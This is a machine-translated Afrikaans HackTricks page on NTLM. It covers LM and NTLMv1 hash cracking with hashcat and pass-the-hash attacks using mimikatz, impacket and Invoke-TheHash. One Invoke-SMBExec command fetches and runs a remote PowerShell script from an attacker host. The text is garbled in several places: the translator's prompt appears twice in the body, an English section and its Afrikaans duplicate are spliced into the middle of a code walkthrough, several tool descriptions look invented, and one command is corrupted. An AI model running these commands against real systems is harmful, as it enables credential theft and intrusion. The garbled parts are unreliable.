# NTLM

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Basiese Inligting

In omgewings waar **Windows XP en Server 2003** in werking is, word LM (Lan Manager) hasings gebruik, alhoewel dit algemeen erken word dat dit maklik gekompromitteer kan word. 'n Spesifieke LM-hashing, `AAD3B435B51404EEAAD3B435B51404EE`, dui op 'n scenario waar LM nie gebruik word nie en dit verteenwoordig die hashing vir 'n leë string.

Standaard is die **Kerberos**-verifikasieprotokol die primêre metode wat gebruik word. NTLM (NT LAN Manager) tree op onder spesifieke omstandighede: afwesigheid van Active Directory, nie-bestaan van die domein, wanfunksionering van Kerberos as gevolg van verkeerde konfigurasie, of wanneer verbindinge probeer word met behulp van 'n IP-adres eerder as 'n geldige gasheernaam.

Die teenwoordigheid van die **"NTLMSSP"**-kop in netwerkpakette dui op 'n NTLM-verifikasieproses.

Ondersteuning vir die verifikasieprotokolle - LM, NTLMv1 en NTLMv2 - word fasiliteer deur 'n spesifieke DLL wat geleë is by `%windir%\Windows\System32\msv1\_0.dll`.

**Kernpunte**:
- LM-hasings is kwesbaar en 'n leë LM-hashing (`AAD3B435B51404EEAAD3B435B51404EE`) dui op die nie-gebruik daarvan.
- Kerberos is die verstek verifikasiemetode, met NTLM wat slegs onder sekere omstandighede gebruik word.
- NTLM-verifikasiepakkette is identifiseerbaar aan die "NTLMSSP"-kop.
- LM, NTLMv1 en NTLMv2-protokolle word ondersteun deur die stelsel-lêer `msv1\_0.dll`.

## LM, NTLMv1 en NTLMv2

Jy kan nagaan en konfigureer watter protokol gebruik sal word:

### GUI

Voer _secpol.msc_ uit -> Plaaslike beleide -> Sekuriteitsopsies -> Netwerksekuriteit: LAN Manager-verifikasievlak. Daar is 6 vlakke (van 0 tot 5).

![](<../../.gitbook/assets/image (92).png>)

### Register

Dit stel die vlak 5 in:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Moontlike waardes:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basiese NTLM-domeinverifikasieskema

1. Die **gebruiker** voer sy **inskrywings** in.
2. Die klientrekenaar **stuur 'n verifikasieversoek** deur die **domeinnaam** en die **gebruikersnaam** te stuur.
3. Die **bediener** stuur die **uitdaging**.
4. Die klientrekenaar **versleutel** die **uitdaging** deur die has van die wagwoord as sleutel te gebruik en stuur dit as 'n antwoord.
5. Die **bediener stuur** die **domeinnaam, die gebruikersnaam, die uitdaging en die antwoord** na die **Domeinbeheerder**. As daar **nie** 'n Geaktiveerde Gids gekonfigureer is nie of die domeinnaam die naam van die bediener is, word die geloofsbriewe **plaaslik nagegaan**.
6. Die **domeinbeheerder kyk of alles korrek is** en stuur die inligting na die bediener.

Die **bediener** en die **Domeinbeheerder** kan 'n **Veilige Kanaal** skep via die **Netlogon**-bediener, aangesien die Domeinbeheerder die wagwoord van die bediener ken (dit is binne die **NTDS.DIT**-databasis).

### Plaaslike NTLM-verifikasieskema

Die verifikasie is soos die een **voorheen genoem**, maar die **bediener** ken die **has van die gebruiker** wat probeer verifieer word binne die **SAM**-lêer. Dus, in plaas daarvan om die Domeinbeheerder te vra, sal die **bediener self nagaan** of die gebruiker kan verifieer.

### NTLMv1-uitdaging

Die **uitdagingslengte is 8 byte** en die **antwoord is 24 byte** lank.

Die **has NT (16 byte)** word verdeel in **3 dele van elk 7 byte** (7B + 7B + (2B+0x00\*5)): die **laaste deel word met nulle gevul**. Dan word die **uitdaging** **afsonderlik versleutel** met elke deel en die **resultaatversleutelde byte** word **saamgevoeg**. Totaal: 8B + 8B + 8B = 24 byte.

**Probleme**:

* Gebrek aan **willekeurigheid**
* Die 3 dele kan **afsonderlik aangeval** word om die NT-has te vind
* **DES is kraakbaar**
* Die 3de sleutel bestaan altyd uit **5 nulle**.
* Met dieselfde uitdaging sal die **antwoord dieselfde wees**. Jy kan dus die string "**1122334455667788**" as 'n **uitdaging** aan die slagoffer gee en die antwoord aanval met **vooraf berekende reënboogtabelle**.

### NTLMv1-aanval

Dit word teenwoordig minder algemeen om omgewings te vind met Geen Beperkte Delegasie gekonfigureer nie, maar dit beteken nie jy kan nie 'n Drukspooler-diens misbruik nie.

Jy kan sekere geloofsbriewe/sessies wat jy reeds op die AD het, misbruik om die drukker te vra om teen sommige **gasheer onder jou beheer** te verifieer. Dan kan jy met behulp van `metasploit auxiliary/server/capture/smb` of `responder` die verifikasie-uitdaging instel op 1122334455667788, die verifikasiepoging vasvang, en as dit gedoen is met behulp van **NTLMv1** sal jy dit kan **kraak**.\
As jy `responder` gebruik, kan jy probeer om die vlag `--lm` te gebruik om die **verifikasie af te gradeer**.\
Merk op dat vir hierdie tegniek die verifikasie uitgevoer moet word met behulp van NTLMv1 (NTLMv2 is nie geldig nie).

Onthou dat die drukker die rekenaarrekening tydens die verifikasie sal gebruik, en rekenaarrekeninge gebruik **lang en willekeurige wagwoorde** wat jy waarskynlik nie kan kraak nie met gewone **woordeboeke**. Maar die **NTLMv1**-verifikasie **gebruik DES** ([meer inligting hier](./#ntlmv1-uitdaging)), dus deur van sommige dienste wat spesiaal toegewy is aan die kraak van DES gebruik te maak, sal jy dit kan kraak (jy kan byvoorbeeld [https://crack.sh/](https://crack.sh) gebruik).

### NTLMv1-aanval met hashcat

NTLMv1 kan ook gebreek word met die NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) wat NTLMv1-boodskappe in 'n metode formateer wat met hashcat gebreek kan word.

Die bevel
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Die volgende is inhoud uit 'n hakboek oor hak tegnieke. Die volgende inhoud is uit die lêer /hive/hacktricks/windows-hardening/ntlm/README.md. Vertaal die relevante Engelse teks na Afrikaans en gee die vertaling terug met presies dieselfde markdown- en html-sintaksis. Moenie dinge soos kode, hak tegniek name, hak woord, wolk/SaaS platform name (soos Workspace, aws, gcp...), die woord 'leak', pentesting, en markdown etikette vertaal nie. Voeg ook geen ekstra goed by behalwe die vertaling en markdown sintaksis nie.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Skep 'n lêer met die inhoud van:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Voer hashcat uit (verspreid dit indien moontlik met 'n hulpmiddel soos hashtopolis), aangesien dit anders 'n paar dae sal neem.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
In hierdie geval weet ons dat die wagwoord hiervoor "password" is, so ons gaan vals speel vir demonstrasie doeleindes:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Ons moet nou die hashcat-hulpmiddels gebruik om die gekraakte DES-sleutels om te skakel na dele van die NTLM-hash:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
## NTLM

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for user authentication.

### NTLM Authentication Process

1. The client sends a request to the server.
2. The server responds with a challenge.
3. The client encrypts the challenge using the user's password hash and sends it back to the server.
4. The server verifies the response by decrypting it using the user's password hash.
5. If the response is valid, the server grants access to the client.

### NTLM Vulnerabilities

1. **Pass-the-Hash (PtH) Attack**: An attacker captures the NTLM hash of a user and uses it to authenticate as that user without knowing the actual password.
2. **Pass-the-Ticket (PtT) Attack**: An attacker captures the Kerberos ticket of a user and uses it to authenticate as that user without knowing the actual password.
3. **NTLM Relay Attack**: An attacker intercepts the NTLM authentication request and relays it to another server, gaining unauthorized access to the target system.
4. **NTLM Downgrade Attack**: An attacker forces the use of NTLM authentication instead of more secure protocols like Kerberos.

### Mitigations

1. **Enable SMB Signing**: Enabling SMB signing ensures the integrity and authenticity of SMB packets, protecting against NTLM relay attacks.
2. **Disable NTLMv1**: Disabling NTLMv1 prevents the use of weak NTLM protocols and forces the use of more secure authentication methods.
3. **Enable Extended Protection for Authentication**: Enabling Extended Protection for Authentication adds an extra layer of security to NTLM authentication, protecting against NTLM relay attacks.
4. **Implement Credential Guard**: Credential Guard protects against PtH attacks by storing user credentials in a secure isolated container.
5. **Use Strong Passwords**: Using strong, complex passwords reduces the risk of password cracking and makes PtH attacks more difficult.
6. **Implement Multi-Factor Authentication (MFA)**: MFA adds an extra layer of security by requiring users to provide multiple forms of authentication, making it harder for attackers to gain unauthorized access.

### References

- [Microsoft NTLM Technical Reference](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/)

---

## NTLM

NTLM (NT LAN-bestuurder) is 'n stel Microsoft-sekuriteitsprotokolle wat outentisering, integriteit en vertroulikheid aan gebruikers bied. Dit word algemeen gebruik in Windows-omgewings vir gebruikersoutentisering.

### NTLM-outentiseringsproses

1. Die kliënt stuur 'n versoek na die bediener.
2. Die bediener reageer met 'n uitdaging.
3. Die kliënt versleutel die uitdaging met behulp van die gebruiker se wagwoordhash en stuur dit terug na die bediener.
4. Die bediener verifieer die respons deur dit te ontsleutel met behulp van die gebruiker se wagwoordhash.
5. As die respons geldig is, verleen die bediener toegang aan die kliënt.

### NTLM-gebreklikhede

1. **Pass-the-Hash (PtH) Aanval**: 'n Aanvaller vang die NTLM-hash van 'n gebruiker en gebruik dit om as daardie gebruiker te outentiseer sonder om die werklike wagwoord te ken.
2. **Pass-the-Ticket (PtT) Aanval**: 'n Aanvaller vang die Kerberos-kaartjie van 'n gebruiker en gebruik dit om as daardie gebruiker te outentiseer sonder om die werklike wagwoord te ken.
3. **NTLM Relay Aanval**: 'n Aanvaller onderskep die NTLM-outentiseringsversoek en stuur dit deur na 'n ander bediener, wat ongemagtigde toegang tot die teikensisteem verkry.
4. **NTLM Afdwing Aanval**: 'n Aanvaller dwing die gebruik van NTLM-outentisering af in plaas van meer veilige protokolle soos Kerberos.

### Versagtings

1. **Aktiveer SMB-ondertekening**: Deur SMB-ondertekening te aktiveer, verseker dit die integriteit en egtheid van SMB-pakkies en beskerm teen NTLM-relay-aanvalle.
2. **Deaktiveer NTLMv1**: Deur NTLMv1 te deaktiveer, word die gebruik van swak NTLM-protokolle voorkom en word die gebruik van meer veilige outentiseringsmetodes afgedwing.
3. **Aktiveer Uitgebreide Beskerming vir Outentisering**: Deur Uitgebreide Beskerming vir Outentisering te aktiveer, word 'n ekstra laag sekuriteit by NTLM-outentisering gevoeg en beskerm teen NTLM-relay-aanvalle.
4. **Implementeer Credential Guard**: Credential Guard beskerm teen PtH-aanvalle deur gebruikerslegitimasie in 'n veilige geïsoleerde houer te stoor.
5. **Gebruik Sterk Wagwoorde**: Deur sterk, komplekse wagwoorde te gebruik, word die risiko van wagwoordkraak verminder en word PtH-aanvalle moeiliker.
6. **Implementeer Multi-Faktor Outentisering (MFA)**: MFA voeg 'n ekstra laag sekuriteit by deur gebruikers te vereis om verskeie vorme van outentisering te voorsien, wat dit moeiliker maak vir aanvallers om ongemagtigde toegang te verkry.

### Verwysings

- [Microsoft NTLM Tegniese Verwysing](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/)
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Die volgende is inhoud uit 'n hakboek oor hakmetodes. Die volgende inhoud is uit die lêer /hive/hacktricks/windows-hardening/ntlm/README.md. Vertaal die relevante Engelse teks na Afrikaans en gee die vertaling terug met presies dieselfde markdown- en html-sintaksis. Moenie dinge soos kode, hakmetode name, hakwoorde, wolk/SaaS-platformname (soos Workspace, aws, gcp...), die woord 'leak', pentesting, en markdown-etikette vertaal nie. Voeg ook geen ekstra dinge by behalwe die vertaling en markdown-sintaksis nie.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Uitdaging

Die **uitdaginglengte is 8 byte** en **2 antwoorde word gestuur**: Een is **24 byte** lank en die lengte van die **ander** is **veranderlik**.

**Die eerste antwoord** word geskep deur die **string** wat bestaan uit die **kliënt en die domein** te versleutel met behulp van **HMAC\_MD5** en as **sleutel** die **MD4-hash** van die **NT-hash** te gebruik. Dan sal die **resultaat** as **sleutel** gebruik word om die **uitdaging** te versleutel met behulp van **HMAC\_MD5**. Hierby sal **'n kliëntuitdaging van 8 byte gevoeg word**. Totaal: 24 B.

Die **tweede antwoord** word geskep deur **verskeie waardes** te gebruik ('n nuwe kliëntuitdaging, 'n **tydstempel** om **herhaalaanvalle** te voorkom...).

As jy 'n **pcap het wat 'n suksesvolle outentiseringsproses vasgevang het**, kan jy hierdie gids volg om die domein, gebruikersnaam, uitdaging en antwoord te kry en probeer om die wagwoord te kraak: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pas-die-Hash

**Sodra jy die hash van die slagoffer het**, kan jy dit gebruik om **hom te impersoneer**.\
Jy moet 'n **hulpmiddel** gebruik wat die **NTLM-outentisering uitvoer met** daardie **hash**, **of** jy kan 'n nuwe **sessielogon** skep en daardie **hash** in die **LSASS** inspuit, sodat wanneer enige **NTLM-outentisering uitgevoer word**, daardie **hash gebruik sal word**. Die laaste opsie is wat mimikatz doen.

**Onthou asseblief dat jy Pas-die-Hash-aanvalle ook met Rekenaarrekeninge kan uitvoer.**

### **Mimikatz**

**Moet as administrateur uitgevoer word**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Dit sal 'n proses begin wat behoort aan die gebruikers wat mimikatz begin het, maar intern in LSASS is die gestoorde geloofsbriewe diegene binne die mimikatz parameters. Dan kan jy toegang kry tot netwerkbronne asof jy daardie gebruiker is (soortgelyk aan die `runas /netonly` truuk, maar jy hoef nie die plat-teks wagwoord te weet nie).

### Pass-the-Hash vanaf Linux

Jy kan kode-uitvoering in Windows-masjiene verkry deur Pass-the-Hash vanaf Linux te gebruik.\
[**Klik hier om te leer hoe om dit te doen.**](../../windows/ntlm/broken-reference/)

### Impacket Windows saamgestelde gereedskap

Jy kan [impacket binaêre lêers vir Windows hier aflaai](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (In hierdie geval moet jy 'n opdrag spesifiseer, cmd.exe en powershell.exe is nie geldig om 'n interaktiewe skerm te verkry nie)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Daar is verskeie Impacket binaêre lêers...

### Invoke-TheHash

Jy kan die PowerShell-skripte hier kry: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

Invoke-WMIExec is 'n PowerShell-script wat gebruik kan word om 'n WMI-verbinding te maak en uitvoerbare opdragte op 'n afgeleë Windows-rekenaar uit te voer. Hierdie tegniek maak gebruik van die Windows-beheerinstrumentasie (WMI) om toegang tot en beheer oor 'n afgeleë rekenaar te verkry.

Hier is die sintaksis vir die Invoke-WMIExec-script:

```powershell
Invoke-WMIExec -Target <target> -Username <username> -Password <password> -Command <command>
```

- **Target**: Die IP-adres of die DNS-naam van die teikenrekenaar.
- **Username**: Die gebruikersnaam wat gebruik moet word om aan te meld by die teikenrekenaar.
- **Password**: Die wagwoord vir die gebruikersnaam.
- **Command**: Die opdrag wat uitgevoer moet word op die teikenrekenaar.

Hier is 'n voorbeeld van hoe die Invoke-WMIExec-script gebruik kan word om 'n opdrag op 'n afgeleë rekenaar uit te voer:

```powershell
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Command "ipconfig /all"
```

Hierdie voorbeeld sal die opdrag "ipconfig /all" uitvoer op die rekenaar met die IP-adres 192.168.1.100 deur gebruik te maak van die gebruikersnaam "Administrator" en die wagwoord "P@ssw0rd".

Dit is belangrik om te onthou dat die Invoke-WMIExec-script slegs gebruik moet word met toestemming van die eienaar van die teikenrekenaar. Misbruik van hierdie tegniek kan lei tot wettige gevolge.
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

Invoke-SMBClient is 'n PowerShell-module wat gebruik kan word om 'n SMB-kliënt te simuleer en te kommunikeer met 'n SMB-bediener. Hierdie module bied 'n kragtige manier om SMB-verbindings te skep en te bestuur vir verskeie doeleindes, insluitend die ondersoek van netwerkverbindings, die ophaling van lêers en die uitvoering van opdragte op 'n SMB-bediener.

Hier is 'n paar voorbeelde van hoe jy Invoke-SMBClient kan gebruik:

- **Verbind met 'n SMB-bediener**: Jy kan die `Connect-SMBServer`-funksie gebruik om 'n verbindin te maak met 'n SMB-bediener deur die IP-adres of die DNS-naam van die bediener te spesifiseer, asook die gebruikersnaam en wagwoord vir verifikasie.

- **Lys lêers en mappe op 'n SMB-bediener**: Gebruik die `Get-SMBFile`-funksie om 'n lys van lêers en mappe op 'n SMB-bediener te kry. Jy kan spesifieke padname spesifiseer om slegs die inhoud van 'n spesifieke map te kry.

- **Ophaling van lêers van 'n SMB-bediener**: Gebruik die `Get-SMBFile`-funksie om lêers van 'n SMB-bediener af te laai. Jy kan die lêerpad op die bediener en die bestemmingspad op jou plaaslike masjien spesifiseer.

- **Uitvoering van opdragte op 'n SMB-bediener**: Gebruik die `Invoke-SMBCommand`-funksie om opdragte op 'n SMB-bediener uit te voer. Jy kan die opdrag spesifiseer as 'n enkele string of as 'n reeks van opdragte.

Hierdie module bied 'n kragtige en veelsydige manier om met SMB-bedieners te kommunikeer en kan nuttig wees vir verskeie doeleindes, insluitend netwerkondersoek en lêerbestuur.
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Roep-SMBEnum aan

`Invoke-SMBEnum` is 'n PowerShell-module wat gebruik kan word om 'n NTLM-lekkasie aan te val en inligting oor die doelwitstelsel te verkry. Hierdie module maak gebruik van die SMB-protokol om te kommunikeer met die doelwitstelsel en verskillende tegnieke om inligting soos gebruikersname, domeinnaam, groepe, aktiewe sessies en nog baie meer te onttrek.

Hier is 'n voorbeeld van hoe om `Invoke-SMBEnum` te gebruik:

```powershell
Invoke-SMBEnum -Target 192.168.1.10
```

Hierdie bevel sal die `Invoke-SMBEnum`-module aanroep en probeer om inligting oor die doelwitstelsel by IP-adres 192.168.1.10 te verkry. Die module sal verskillende tegnieke gebruik om die NTLM-lekkasie aan te val en relevante inligting te onttrek.

Dit is belangrik om te onthou dat die gebruik van hierdie module sonder toestemming van die eienaar van die doelwitstelsel onwettig is en 'n oortreding van die wet kan wees. Dit moet slegs gebruik word vir wettige doeleindes, soos pentesting of om sekuriteitslekke in eie stelsels te identifiseer en te verhelp.
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Hierdie funksie is 'n **mengsel van al die ander funksies**. Jy kan **verskeie gasheer-rekenaars** deurgee, **iemand uitsluit** en die **opsie** kies wat jy wil gebruik (_SMBExec, WMIExec, SMBClient, SMBEnum_). As jy enige van die **SMBExec** en **WMIExec** opsies kies, maar nie enige _**Command**_ parameter verskaf nie, sal dit net **nagaan** of jy **genoeg toestemmings** het.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pas die Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Moet as administrateur uitgevoer word**

Hierdie instrument sal dieselfde ding doen as mimikatz (LSASS-geheue wysig).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Handleiding vir Windows-afstandsbediening met gebruikersnaam en wagwoord

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Onttrekking van geloofsbriewe van 'n Windows-gashuis

**Vir meer inligting oor** [**hoe om geloofsbriewe van 'n Windows-gashuis te verkry, moet jy hierdie bladsy lees**](broken-reference)**.**

## NTLM Relay en Responder

**Lees 'n meer gedetailleerde gids oor hoe om hierdie aanvalle uit te voer hier:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Ontleding van NTLM-uitdagings van 'n netwerkvang

**Jy kan gebruik maak van** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
